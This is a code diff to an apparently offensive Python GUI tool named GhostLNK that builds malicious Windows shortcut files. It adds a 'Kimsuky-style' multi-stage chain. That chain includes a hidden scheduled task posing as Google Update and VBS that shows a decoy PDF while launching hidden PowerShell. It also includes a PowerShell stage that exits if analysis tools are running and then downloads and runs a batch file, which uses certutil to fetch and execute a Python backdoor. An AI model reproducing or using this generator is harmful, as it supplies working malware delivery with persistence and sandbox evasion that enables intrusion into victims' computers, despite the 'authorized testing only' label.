@@ -84,7 +84,7 @@ class GhostLNKGUI(QMainWindow):
         credit.setStyleSheet("color: #FFFF00; font-size: 12px; font-weight: bold; font-family: 'Courier New', monospace;")
         left_layout.addWidget(credit)
 
-        subtitle = QLabel("Dropbox: &dl=1 | STEALTH | HIDE | RAW TARGET | EVASION | EMBED | APPEND | ICON SMUGGLING | SELF-EXTRACT")
+        subtitle = QLabel("Dropbox: &dl=1 | STEALTH | HIDE | RAW TARGET | EVASION | EMBED | APPEND | ICON SMUGGLING | SELF-EXTRACT | KIMSUKY CHAIN")
         subtitle.setAlignment(Qt.AlignmentFlag.AlignLeft)
         subtitle.setStyleSheet("color: #00FFFF; font-size: 10px; font-family: 'Courier New', monospace;")
         left_layout.addWidget(subtitle)
@@ -131,7 +131,7 @@ class GhostLNKGUI(QMainWindow):
 
         self.create_menu()
         self.log("GhostLNK initialized")
-        self.log("[OK] Self-Extracting LNK (Hex) - hex-encoded VBS for maximum evasion")
+        self.log("[OK] Kimsuky‑Style Multi‑Stage Chain added")
 
     def create_converter_panel(self):
         panel = QWidget()
@@ -445,6 +445,29 @@ class GhostLNKGUI(QMainWindow):
         self.multistage_widget.setVisible(False)
         evasion_layout.addWidget(self.multistage_widget)
 
+        # NEW: Kimsuky‑Style Multi‑Stage Chain
+        self.kimsuky_cb = QCheckBox("Kimsuky‑Style Multi‑Stage Chain")
+        self.kimsuky_cb.setToolTip(
+            "Generate a complete multi‑stage attack chain:\n"
+            "LNK → XML (scheduled task) → VBS (decoy PDF) → PS1 (anti‑sandbox) → BAT → Python payload.\n"
+            "All files are saved to a folder of your choice."
+        )
+        self.kimsuky_cb.toggled.connect(self.toggle_kimsuky)
+        evasion_layout.addWidget(self.kimsuky_cb)
+        self.kimsuky_widget = QWidget()
+        kimsuky_layout = QVBoxLayout(self.kimsuky_widget)
+        kimsuky_layout.setContentsMargins(10, 5, 10, 5)
+        kimsuky_layout.addWidget(QLabel("Decoy PDF URL:"))
+        self.kimsuky_decoy = QLineEdit()
+        self.kimsuky_decoy.setPlaceholderText("https://example.com/decoy.pdf")
+        kimsuky_layout.addWidget(self.kimsuky_decoy)
+        kimsuky_layout.addWidget(QLabel("Final Payload URL (Python backdoor):"))
+        self.kimsuky_payload = QLineEdit()
+        self.kimsuky_payload.setPlaceholderText("https://example.com/backdoor.py")
+        kimsuky_layout.addWidget(self.kimsuky_payload)
+        self.kimsuky_widget.setVisible(False)
+        evasion_layout.addWidget(self.kimsuky_widget)
+
         evasion_group.setLayout(evasion_layout)
         layout.addWidget(evasion_group)
 
@@ -617,6 +640,8 @@ class GhostLNKGUI(QMainWindow):
         self.regsvr_url.setEnabled(not enabled and self.regsvr_cb.isChecked())
         self.multistage_cb.setEnabled(not enabled)
         self.multistage_widget.setVisible(not enabled and self.multistage_cb.isChecked())
+        self.kimsuky_cb.setEnabled(not enabled)
+        self.kimsuky_widget.setVisible(not enabled and self.kimsuky_cb.isChecked())
         self.embedded_input.setEnabled(not enabled)
         self.encoding_combo.setEnabled(not enabled)
         self.xor_cb.setEnabled(not enabled)
@@ -642,6 +667,9 @@ class GhostLNKGUI(QMainWindow):
 
     def toggle_multistage(self, enabled):
         self.multistage_widget.setVisible(enabled)
+
+    def toggle_kimsuky(self, enabled):
+        self.kimsuky_widget.setVisible(enabled)
 
     def browse_raw_target(self):
         file_path, _ = QFileDialog.getOpenFileName(self, "Select Target Executable", "C:\\", "Executable Files (*.exe);;All Files (*)")
@@ -916,6 +944,93 @@ End If
 '''
         return vbs
 
+    def _build_kimsuky_chain(self, decoy_url: str, payload_url: str) -> dict:
+        """Generate all files for the Kimsuky‑style multi‑stage chain."""
+        folder_name = generate_random_folder_name()
+        task_name = f"GoogleUpdateTaskMachine{str(uuid.uuid4())[:8]}"
+        ps1_filename = f"update_{random.randint(1000,9999)}.ps1"
+        bat_filename = f"setup_{random.randint(100,999)}.bat"
+
+        # XML for scheduled task
+        xml_content = f'''<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Description>Google Update Task Machine</Description>
+    <Author>Google Inc.</Author>
+  </RegistrationInfo>
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+    </LogonTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <RunLevel>LeastPrivilege</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>false</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>wscript.exe</Command>
+      <Arguments>//B "%APPDATA%\\Microsoft\\{folder_name}\\stage2.vbs"</Arguments>
+    </Exec>
+  </Actions>
+</Task>'''
+
+        # VBS – opens decoy PDF and launches PowerShell stage
+        vbs_content = f'''
+Set objShell = CreateObject("Wscript.Shell")
+objShell.Run "powershell -WindowStyle Hidden -Command Invoke-Item '{decoy_url}'", 0, False
+objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ""%APPDATA%\\Microsoft\\{folder_name}\\{ps1_filename}""", 0, False
+'''
+
+        # PS1 – anti‑sandbox checks and download next stage
+        ps1_content = f'''
+$bad = @("wireshark","procmon","procexp","vboxservice","vmtoolsd","vboxtray","xenservice","sandboxie","sbiesvc","python","ida","ollydbg","x64dbg");
+$p = Get-Process -ErrorAction SilentlyContinue;
+foreach ($b in $bad) {{ if ($p.Name -match $b) {{ exit }} }}
+$f = "$env:APPDATA\\Microsoft\\{folder_name}";
+attrib +h +s $f;
+(New-Object Net.WebClient).DownloadFile("{payload_url}", "$f\\{bat_filename}");
+Start-Process -FilePath "$f\\{bat_filename}" -WindowStyle Hidden;
+'''
+
+        # BAT – downloads and executes final Python payload
+        bat_content = f'''
+@echo off
+certutil -urlcache -split -f "{payload_url}" "%APPDATA%\\Microsoft\\{folder_name}\\update.py"
+python "%APPDATA%\\Microsoft\\{folder_name}\\update.py"
+'''
+
+        return {
+            "folder": folder_name,
+            "task_name": task_name,
+            "xml": xml_content,
+            "vbs": vbs_content,
+            "ps1": ps1_content,
+            "bat": bat_content,
+            "ps1_filename": ps1_filename,
+            "bat_filename": bat_filename
+        }
+
     def generate_embedded_payload(self):
         script = self.embedded_input.toPlainText().strip()
         if not script:
@@ -1117,6 +1232,31 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
                         return
                 self.log(f"Raw Target Mode: {target_path} {arguments}")
 
+            elif self.kimsuky_cb.isChecked():
+                decoy = self.kimsuky_decoy.text().strip()
+                payload = self.kimsuky_payload.text().strip()
+                if not decoy or not payload:
+                    QMessageBox.warning(self, "Warning", "Kimsuky chain requires Decoy PDF URL and Payload URL.")
+                    return
+                chain = self._build_kimsuky_chain(decoy, payload)
+                folder = QFileDialog.getExistingDirectory(self, "Select folder to save Kimsuky chain files")
+                if not folder:
+                    return
+                # Save all files
+                with open(os.path.join(folder, "task.xml"), "w", encoding="utf-8") as f:
+                    f.write(chain["xml"])
+                with open(os.path.join(folder, "stage2.vbs"), "w", encoding="utf-8") as f:
+                    f.write(chain["vbs"])
+                with open(os.path.join(folder, chain["ps1_filename"]), "w", encoding="utf-8") as f:
+                    f.write(chain["ps1"])
+                with open(os.path.join(folder, chain["bat_filename"]), "w", encoding="utf-8") as f:
+                    f.write(chain["bat"])
+                target_path = r"C:\Windows\explorer.exe"
+                arguments = ""
+                working_dir = None
+                appended_payload = None
+                self.log(f"[OK] Kimsuky chain saved to {folder}")
+
             else:
                 if self.multistage_cb.isChecked():
                     if not self.decoy_url.text().strip() or not self.payload_url.text().strip():
@@ -1221,7 +1361,7 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
                     f.write(vbs_content)
                 self.log(f"[OK] Extractor VBS saved: {os.path.basename(extractor_path)}")
 
-            if not self.raw_mode_cb.isChecked() and not self.mshta_cb.isChecked() and not self.rundll_cb.isChecked() and not self.regsvr_cb.isChecked():
+            if not self.raw_mode_cb.isChecked() and not self.mshta_cb.isChecked() and not self.rundll_cb.isChecked() and not self.regsvr_cb.isChecked() and not self.kimsuky_cb.isChecked():
                 stealth = self.stealth_combo.currentIndex()
                 hide = self.hide_pwsh_cb.isChecked()
                 mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
@@ -1229,7 +1369,7 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
             else:
                 stealth = 0
                 hide = False
-                self.log(f"Generating LNK (Proxy/Icon Smuggling/Self-Extract) - Target: {target_path}")
+                self.log(f"Generating LNK (Proxy/Icon Smuggling/Self-Extract/Kimsuky) - Target: {target_path}")
 
             LNKEngine.create_lnk(
                 save_path, target_path, arguments, icon_path, icon_idx, desc,
@@ -1355,7 +1495,8 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
             "<b>rundll32.exe:</b> Executes JavaScript via mshtml.<br>"
             "<b>regsvr32.exe:</b> Fileless SCT/DLL execution.<br>"
             "<b>LNK Stomping:</b> Spoof displayed target path.<br>"
-            "<b>Self-Extracting LNK (Hex):</b> Hex-encoded VBS appended; extracted and executed silently."
+            "<b>Self-Extracting LNK (Hex):</b> Hex-encoded VBS appended; extracted and executed silently.<br>"
+            "<b>Kimsuky‑Style Chain:</b> LNK → XML → VBS → PS1 → BAT → Python (full campaign)."
         )
 
     def show_embed_help(self):
@@ -1432,5 +1573,6 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
             "> Multi-Stage Stager (VBS + Scheduled Task)<br>"
             "> Embedded Payload with XOR, String Obfuscation, Append, Binary & True Icon Smuggling<br>"
             "> Self-Extracting LNK (Hex) — hex-encoded VBS for maximum evasion<br>"
+            "> Kimsuky‑Style Multi‑Stage Chain — full campaign generation<br>"
             "> Anti-Sandbox Checks<br><br>"
             "For authorized testing only")
